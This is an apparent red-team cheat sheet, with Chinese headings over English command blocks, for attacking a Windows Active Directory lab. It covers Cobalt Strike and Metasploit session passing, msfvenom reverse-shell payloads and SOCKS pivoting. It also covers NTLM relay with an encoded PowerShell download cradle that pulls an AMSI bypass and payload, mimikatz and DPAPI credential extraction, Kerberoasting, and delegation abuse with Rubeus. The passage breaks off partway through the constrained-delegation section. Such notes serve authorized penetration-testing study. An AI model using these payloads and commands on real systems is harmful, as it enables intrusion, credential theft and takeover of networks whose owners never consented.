<h3 id="会话传递"><a href="#会话传递" class="headerlink" title="会话传递"></a>会话传递</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># CASE 1: Beacon Passing (Within Cobalt Strike - Create alternate HTTP beacon while keeping DNS as lifeline)</span><br>beacon&gt; spawn x64 http<br><br><span class="hljs-comment"># CASE 2: Foreign Listener (From CS to Metasploit - Staged Payload - only x86 payloads)</span><br><span class="hljs-comment"># Setup Metasploit listener</span><br>attacker@ubuntu ~&gt; sudo msfconsole <span class="hljs-literal">-q</span><br>msf6 &gt; use exploit/multi/handler<br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_http<br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> LHOST ens5<br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> LPORT <span class="hljs-number">8080</span><br>msf6 exploit(multi/handler) &gt; run<br><span class="hljs-comment"># Setup a Foreign Listener in cobalt strike with above IP &amp; port details</span><br><span class="hljs-comment"># Use Jump psexec to execute the beacon payload and pass the session</span><br>beacon&gt; jump psexec Foreign_listener<br>beacon&gt; spawn x86 Foreign_listener<br><br><span class="hljs-comment"># CASE 3: Shellcode Injection (From CS to Metasploit - Stageless Payload)</span><br><span class="hljs-comment"># Setup up metasploit</span><br>msf6 &gt; use exploit/multi/handler<br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> payload windows/x64/meterpreter_reverse_http<br>msf6 exploit(multi/handler) &gt; exploit<br><span class="hljs-comment"># Generate binary</span><br>ubuntu@DESKTOP<span class="hljs-literal">-3BSK7NO</span> ~&gt; msfvenom <span class="hljs-literal">-p</span> windows/x64/meterpreter_reverse_http LHOST=<span class="hljs-number">10.10</span>.<span class="hljs-number">5.50</span> LPORT=<span class="hljs-number">8080</span> <span class="hljs-operator">-f</span> raw <span class="hljs-literal">-o</span> /mnt/c/Payloads/msf_http_x64.bin<br><span class="hljs-comment"># Inject msf shellcode into process memory</span><br>beacon&gt; shspawn x64 C:\Payloads\msf_http_x64.bin<br></code></pre></td></tr></table></figure>

<h3 id="旋转"><a href="#旋转" class="headerlink" title="旋转"></a>旋转</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Enable Socks Proxy in beacon session (Use SOCKS 5 for better OPSEC)</span><br>beacon&gt; socks <span class="hljs-number">1080</span> socks5 disableNoAuth socks_user socks_password enableLogging<br>beacon&gt; socks <span class="hljs-number">1080</span> socks4<br>beacon&gt; socks stop<br><span class="hljs-comment"># Verify the SOCKS proxy on team server</span><br>attacker@ubuntu ~&gt; sudo ss <span class="hljs-literal">-lpnt</span><br><br><span class="hljs-comment"># Configure Proxychains in Linux</span><br><span class="hljs-variable">$</span> sudo nano /etc/proxychains.conf<br>socks5 <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">1080</span> socks_user socks_password<br><span class="hljs-variable">$attacker</span>@ubuntu ~&gt; proxychains nmap <span class="hljs-literal">-n</span> <span class="hljs-literal">-Pn</span> <span class="hljs-literal">-sT</span> <span class="hljs-literal">-p445</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">4444</span>,<span class="hljs-number">5985</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">122.10</span><br><span class="hljs-variable">$attacker</span>@ubuntu ~ &gt; proxychains wmiexec.py DEV/jking@<span class="hljs-number">10.10</span>.<span class="hljs-number">122.30</span><br><br><span class="hljs-comment"># Tunnel Metasploit Framework exploits and modules through Beacon.</span><br>beacon&gt; socks <span class="hljs-number">6666</span> socks4<br>msf&gt; setg Proxies socks4:TeamServerIP:Port<br>msf&gt; setg ReverseAllowProxy true<br>msf&gt; unsetg Proxies<br><br><span class="hljs-comment"># Use Proxifier for Windows environment </span><br><span class="hljs-built_in">ps</span>&gt; runas /netonly /user:dev/bfarmer mmc.exe<br><span class="hljs-built_in">ps</span>&gt; mimikatz &gt; privilege::debug<br><span class="hljs-built_in">ps</span>&gt; mimikatz &gt; sekurlsa::pth /domain:DEV /user:bfarmer /ntlm:<span class="hljs-number">4</span>ea24377a53e67e78b2bd853974420<span class="hljs-built_in">fc</span> /run:mmc.exe<br><span class="hljs-built_in">PS</span> C:\Users\Attacker&gt; <span class="hljs-variable">$cred</span> = <span class="hljs-built_in">Get-Credential</span><br><span class="hljs-built_in">PS</span> C:\Users\Attacker&gt; <span class="hljs-built_in">Get-ADComputer</span> <span class="hljs-literal">-Server</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">122.10</span> <span class="hljs-literal">-Filter</span> * <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span> | <span class="hljs-built_in">select</span><br><br><span class="hljs-comment"># Use FoxyProxy plugin to access Webportal via SOCKS Proxy</span><br><br><span class="hljs-comment"># Reverse Port Forward (if teamserver is not directly accessible, then use rportfwd to redirect traffic)</span><br>beacon&gt; rportfwd <span class="hljs-number">8080</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">80</span><br>beacon&gt; rportfwd stop <span class="hljs-number">8080</span><br><br>beacon&gt; run netstat <span class="hljs-literal">-anp</span> tcp<br>beacon&gt; powershell <span class="hljs-built_in">New-NetFirewallRule</span> <span class="hljs-literal">-DisplayName</span> <span class="hljs-string">&quot;Test Rule&quot;</span> <span class="hljs-literal">-Profile</span> Domain <span class="hljs-literal">-Direction</span> Inbound <span class="hljs-literal">-Action</span> Allow <span class="hljs-literal">-Protocol</span> TCP <span class="hljs-literal">-LocalPort</span> <span class="hljs-number">8080</span><br><span class="hljs-built_in">ps</span>&gt; <span class="hljs-built_in">iwr</span> <span class="hljs-literal">-Uri</span> http://wkstn<span class="hljs-literal">-2</span>:<span class="hljs-number">8080</span>/a<br>beacon&gt; powershell <span class="hljs-built_in">Remove-NetFirewallRule</span> <span class="hljs-literal">-DisplayName</span> <span class="hljs-string">&quot;Test Rule&quot;</span><br><br><span class="hljs-comment"># -------------------------------------------------------------------------------</span><br><span class="hljs-comment"># NTLM Relay</span><br><br><span class="hljs-comment"># 1. Allow ports inbound on the Windows firewall (One for SMB and one for Powershell cradle).</span><br>beacon&gt; powershell <span class="hljs-built_in">New-NetFirewallRule</span> <span class="hljs-literal">-DisplayName</span> <span class="hljs-string">&quot;8445-In&quot;</span> <span class="hljs-literal">-Direction</span> Inbound <span class="hljs-literal">-Protocol</span> TCP <span class="hljs-literal">-Action</span> Allow <span class="hljs-literal">-LocalPort</span> <span class="hljs-number">8445</span><br>beacon&gt; powershell <span class="hljs-built_in">New-NetFirewallRule</span> <span class="hljs-literal">-DisplayName</span> <span class="hljs-string">&quot;8080-In&quot;</span> <span class="hljs-literal">-Direction</span> Inbound <span class="hljs-literal">-Protocol</span> TCP <span class="hljs-literal">-Action</span> Allow <span class="hljs-literal">-LocalPort</span> <span class="hljs-number">8080</span><br><br><span class="hljs-comment"># 2. Setup reverse port forwarding - one for the SMB capture, the other for a PowerShell download cradle.</span><br>beacon&gt; rportfwd <span class="hljs-number">8080</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">80</span><br>beacon&gt; rportfwd <span class="hljs-number">8445</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">445</span><br><br><span class="hljs-comment"># 3. Setup SOCKS Proxy on the beacon</span><br>beacon&gt; socks <span class="hljs-number">1080</span> socks5 disableNoAuth socks_user socks_password enableLogging<br><br><span class="hljs-comment"># 4. Setup Proxychains to use this proxy</span><br><span class="hljs-variable">$</span> sudo nano /etc/proxychains.conf<br>socks5 <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">1080</span> socks_user socks_password<br><br><span class="hljs-comment"># 5. Use Proxychain to send NTLMRelay traffic to beacon targeting DC and encoded SMB Payload for execution</span><br><span class="hljs-variable">$</span> sudo proxychains ntlmrelayx.py <span class="hljs-literal">-t</span> smb://<span class="hljs-number">10.10</span>.<span class="hljs-number">122.10</span> <span class="hljs-literal">-smb2support</span> <span class="hljs-literal">--no-http-server</span> <span class="hljs-literal">--no-wcf-server</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&#x27;powershell -nop -w hidden -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AdwBrAHMAdABuAC0AMgA6ADgAMAA4ADAALwBhAG0AcwBpAC0AYgB5AHAAYQBzAHMALgBwAHMAMQAiACkAOwBpAGUAeAAgACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwB3AGsAcwB0AG4ALQAyADoAOAAwADgAMAAvAGIAIgApAA==&#x27;</span><br><span class="hljs-comment"># IEX (new-object net.webclient).downloadstring(&quot;http://wkstn-2:8080/amsi-bypass.ps1&quot;);iex (new-object net.webclient).downloadstring(&quot;http://wkstn-2:8080/b&quot;)</span><br><span class="hljs-comment"># Where is the wkstn-2 IP.</span><br><span class="hljs-comment"># 10.10.122.10 is the IP address of dc-2.dev.cyberbotic.io, which is our target.</span><br><span class="hljs-comment"># The encoded command is a download cradle pointing at http://10.10.123.102:8080/b, and /b is an SMB payload.</span><br><br><span class="hljs-comment"># 6. Upload PortBender driver and load its .cna file (Cobalt Strike &gt; Script Manager and load PortBender.cna from C:\Tools\PortBender)</span><br>beacon&gt; <span class="hljs-built_in">cd</span> C:\Windows\system32\drivers<br>beacon&gt; upload C:\Tools\PortBender\WinDivert64.sys<br>beacon&gt; PortBender redirect <span class="hljs-number">445</span> <span class="hljs-number">8445</span><br><br><span class="hljs-comment"># 7. Manually try to access share on our system or use MSPRN, Printspooler to force authentication (Refer to Notes)</span><br><span class="hljs-comment"># Manually triggering the attack (Usin a console of Wkstn-1 as nlamb user to make authentication attempt on wkstn-2.)</span><br>C:\Users\nlamb&gt;hostname<br>wkstn<span class="hljs-literal">-1</span><br>C:\Users\nlamb&gt;<span class="hljs-built_in">dir</span> \\<span class="hljs-number">10.10</span>.<span class="hljs-number">123.102</span>\relayme<br>C:\Users\nlamb&gt;<span class="hljs-built_in">dir</span> \\wkstn<span class="hljs-literal">-2</span>\relayme<br><span class="hljs-comment"># 8. Verify the access in weblog and use link command to connect with SMB beacon</span><br>beacon&gt; link dc<span class="hljs-literal">-2</span>.dev.cyberbotic.io TSVCPIPE<span class="hljs-literal">-81180acb-0512-44d7-81fd-fbfea25fff10</span><br></code></pre></td></tr></table></figure>

<h3 id="数据保护-API-DPAPI"><a href="#数据保护-API-DPAPI" class="headerlink" title="数据保护 API (DPAPI)"></a>数据保护 API (DPAPI)</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Use mimikatz to dump secrets from windows vault</span><br>beacon&gt; mimikatz !vault::list<br>beacon&gt; mimikatz !vault::cred /patch<br><br><span class="hljs-comment"># Part 1: Enumerate stored credentials, Make sure to enumerate as both Admin and Domain User in a machine.</span><br><span class="hljs-comment"># 0. Check if system has credentials stored in either web or windows vault</span><br>beacon&gt; run vaultcmd /list<br>beacon&gt; run vaultcmd /listcreds:<span class="hljs-string">&quot;Windows Credentials&quot;</span> /all<br>beacon&gt; run vaultcmd /listcreds:<span class="hljs-string">&quot;Web Credentials&quot;</span> /all<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault<br><br><span class="hljs-comment"># Part 2.1: Scheduled Task Credentials</span><br><span class="hljs-comment"># 0. Before manually trying to extract Credentials try below command ones which is equivalent of the below commands and gives same.</span><br>beacon&gt; mimikatz !vault::cred /patch<br><span class="hljs-comment"># 1. Credentials for task scheduler are stored at below location in encrypted blob</span><br>beacon&gt; <span class="hljs-built_in">ls</span> C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials<br><span class="hljs-comment"># 2. Find the GUID (guidMasterKey) of Master key associated with encrypted blob (F31...B6E)</span><br>beacon&gt; mimikatz dpapi::cred /<span class="hljs-keyword">in</span>:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E<br><span class="hljs-comment"># 3. Dump all the master keys and filter the one we need based on GUID identified in previous step</span><br>beacon&gt; mimikatz !sekurlsa::dpapi<br><span class="hljs-comment"># 4. Use the Encrypted Blob and Master Key to decrypt and extract plain text password</span><br>beacon&gt; mimikatz dpapi::cred /<span class="hljs-keyword">in</span>:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E /masterkey:<span class="hljs-number">10530</span>dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9<br><br><span class="hljs-comment"># Part 2.2: Extracting stored RDP Password</span><br><br><span class="hljs-comment"># 0. Verify if any credentials are stored or not</span><br>beacon&gt; run vaultcmd /list<br>beacon&gt; run vaultcmd /listcreds:<span class="hljs-string">&quot;Windows Credentials&quot;</span> /all<br>beacon&gt; run vaultcmd /listcreds:<span class="hljs-string">&quot;Web Credentials&quot;</span> /all<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault<br><br><span class="hljs-comment"># 1. Enumerate the location of encrypted credentials blob (Returns ID of Enc blob and GUID of Master Key)</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsCredentialFiles<br><br><span class="hljs-comment"># 2. Verify the credential blob in users cred directory (Note enc blob ID)</span><br>beacon&gt; <span class="hljs-built_in">ls</span> C:\Users\bfarmer\AppData\Local\Microsoft\Credentials<br><br><span class="hljs-comment"># 3. Master keys are stored in the users&#x27; roaming &quot;Protect&quot; directory (Note GUID of master key matching with Seatbelt)</span><br>beacon&gt; <span class="hljs-built_in">ls</span> C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S<span class="hljs-literal">-1-5-21-569305411-121244042-2357301523-1104</span><br><br><span class="hljs-comment"># 4. Decrypt the master key first to obtain the actual AES128/256 encryption key, and then use that key to decrypt the credential blob. (Need to be execute in context of user who owns the key, use @ modifier)</span><br><span class="hljs-comment"># Requires Elevation or interaction with LSASS</span><br>beacon&gt; mimikatz !sekurlsa::dpapi<br><span class="hljs-comment"># Does not requires elevation or interaction with LSASS (Check last lines with &quot;domainkey with RPC&quot; line)</span><br>beacon&gt; mimikatz dpapi::masterkey /<span class="hljs-keyword">in</span>:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S<span class="hljs-literal">-1-5-21-569305411-121244042-2357301523-1104</span>\bfc5090d<span class="hljs-literal">-22fe-4058-8953-47f6882f549e</span> /rpc<br><br><span class="hljs-comment"># 5. Use Master key to decrypt the credentials blob</span><br>beacon&gt; mimikatz dpapi::cred /<span class="hljs-keyword">in</span>:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\<span class="hljs-number">6</span>C33AC85D0C4DCEAB186B3B2E5B1AC7C /masterkey:<span class="hljs-number">8</span>d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214<br></code></pre></td></tr></table></figure>

<h3 id="凯尔伯罗斯"><a href="#凯尔伯罗斯" class="headerlink" title="凯尔伯罗斯"></a>凯尔伯罗斯</h3><ul>
<li><p>Kerberoasting&#x2F;ASREPRoasting</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Kerberosting</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe <span class="hljs-literal">--search</span> <span class="hljs-string">&quot;(&amp;(objectCategory=user)(servicePrincipalName=*))&quot;</span> <span class="hljs-literal">--attributes</span> cn,servicePrincipalName,samAccountName<br><span class="hljs-comment"># To avoid Honeypot accounts, few enumerations can be performed</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainUser</span> <span class="hljs-literal">-Identity</span> mssql_svc,squid_svc,honey_svc | <span class="hljs-built_in">select</span> samaccountname,logoncount,badpasswordtime,lastlogontimestamp,lastlogoff,lastlogon,badpwdcount,whencreated,pwdlastset<br>  <br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc,squid_svc /nowrap<br>  <br><span class="hljs-built_in">ps</span>&gt; hashcat <span class="hljs-literal">-a</span> <span class="hljs-number">3</span> <span class="hljs-literal">-m</span> <span class="hljs-number">13100</span> hashes wordlist<br><span class="hljs-comment"># I experienced some hash format incompatibility with john.  Removing the SPN so it became: $krb5tgs$23$*mssql_svc$dev.cyberbotic.io*$6A9E[blah] seemed to address the issue.</span><br><span class="hljs-built_in">ps</span>&gt; john <span class="hljs-literal">--format</span>=krb5tgs <span class="hljs-literal">--wordlist</span>=wordlist mssql_svc<br>  <br><span class="hljs-comment"># ASREPRoast</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe <span class="hljs-literal">--search</span> <span class="hljs-string">&quot;(&amp;(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&quot;</span> <span class="hljs-literal">--attributes</span> cn,distinguishedname,samaccountname<br><span class="hljs-comment"># To avoid Honeypot accounts, few enumerations can be performed</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainUser</span> <span class="hljs-literal">-Identity</span> mssql_svc,squid_svc,honey_svc | <span class="hljs-built_in">select</span> samaccountname,logoncount,badpasswordtime,lastlogontimestamp,lastlogoff,lastlogon,badpwdcount,whencreated,pwdlastset<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:squid_svc /nowrap<br>  <br><span class="hljs-built_in">ps</span>&gt; hashcat <span class="hljs-literal">-a</span> <span class="hljs-number">3</span> <span class="hljs-literal">-m</span> <span class="hljs-number">18200</span> svc_oracle wordlist<br><span class="hljs-built_in">ps</span>&gt; john <span class="hljs-literal">--format</span>=krb5asrep <span class="hljs-literal">--wordlist</span>=wordlist squid_svc<br></code></pre></td></tr></table></figure>
</li>
<li><p>无约束委派</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Unconstrained Delegation (Caches TGT of any user accessing its service)</span><br>  <br><span class="hljs-comment"># 1. Identify the computer objects having Unconstrained Delegation enabled</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe <span class="hljs-literal">--search</span> <span class="hljs-string">&quot;(&amp;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> <span class="hljs-literal">--attributes</span> samaccountname,dnshostname<br>  <br><span class="hljs-comment"># 2. Dumping the cached TGT ticket (requires system access on affected system)</span><br>beacon&gt; getuid<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:<span class="hljs-number">0</span>x14794e /nowrap<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:<span class="hljs-number">10</span> /nowrap<br>  <br><span class="hljs-comment"># 3. Execute PrintSpool attack to force DC to authenticate with WEB </span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe dc<span class="hljs-literal">-2</span>.dev.cyberbotic.io web.dev.cyberbotic.io<br>  <br><span class="hljs-comment"># 4 (a). For MACHINE TGT : Use Machine TGT (DC) fetched to gain RCE on itself using S4U abuse (/self flag)</span><br><span class="hljs-comment"># NOTE: A machine account TGT ticket if injected will not work probably, So we have to  abuse S4U2SELF to obtain TGS and get access as Local Admin to that machine.</span><br><span class="hljs-comment"># Verify this by injecting the TGT insto a sacrificial process and try to access the files. Check S4U2Self Notes below.</span><br>  <br><span class="hljs-comment"># Generate TGS from TGT</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc<span class="hljs-literal">-2</span>.dev.cyberbotic.io /user:dc<span class="hljs-literal">-2</span><span class="hljs-variable">$</span> /nowrap /ticket:doIFuj[<span class="hljs-type">...</span>]lDLklP<br><span class="hljs-comment"># Inject TGS in a sacrificial process</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[<span class="hljs-type">...</span>]MuaW8=<br>beacon&gt; steal_token <span class="hljs-number">2664</span><br>beacon&gt; <span class="hljs-built_in">ls</span> \\dc<span class="hljs-literal">-2</span>.dev.cyberbotic.io\c<span class="hljs-variable">$</span><br>  <br><span class="hljs-comment"># 4 (b). For DOMAIN USER TGT : Inject the ticket and access the service.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[<span class="hljs-type">...</span>]MuaW8=<br>beacon&gt; steal_token <span class="hljs-number">2664</span><br>beacon&gt; <span class="hljs-built_in">ls</span> \\dc<span class="hljs-literal">-2</span>.dev.cyberbotic.io\c<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>受约束的授权</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Constrained Delegation (allows to request TGS for any user using its TGT)</span><br>  <br><span class="hljs-comment"># 1. Identify the computer/User objects having Constrained Delegation is enabled</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe <span class="hljs-literal">--search</span> <span class="hljs-string">&quot;(&amp;(objectCategory=computer)(msds-allowedtodelegateto=*))&quot;</span> <span class="hljs-literal">--attributes</span> dnshostname,samaccountname,msds<span class="hljs-literal">-allowedtodelegateto</span> <span class="hljs-literal">--json</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe <span class="hljs-literal">--search</span> <span class="hljs-string">&quot;(&amp;(objectCategory=user)(msds-allowedtodelegateto=*))&quot;</span> <span class="hljs-literal">--attributes</span> dnshostname,samaccountname,msds<span class="hljs-literal">-allowedtodelegateto</span> <span class="hljs-literal">--json</span><br>  <br><span class="hljs-comment"># 2 (a). Dump the TGT of User/Computer Account having constrained Delegation enabled (use asktgt or NTLM hash)</span><br>beacon&gt; getuid<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:<span class="hljs-number">0</span>x3e7 /service:krbtgt /nowrap<br><span class="hljs-comment"># 2 (b). Using Machine/User NTLM Hash to generate TGT.</span><br>beacon&gt; mimikatz !sekurlsa::logonpasswords<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:sql<span class="hljs-literal">-2</span><span class="hljs-variable">$</span> /rc4:<span class="hljs-number">49</span>d47d3af2329a410e6510a7ccd535c3 /nowrap<br>  <br><span class="hljs-comment"># 3 (a). Use S4U technique to request TGS for delegated service using machines TGT (Use S4U2Proxy 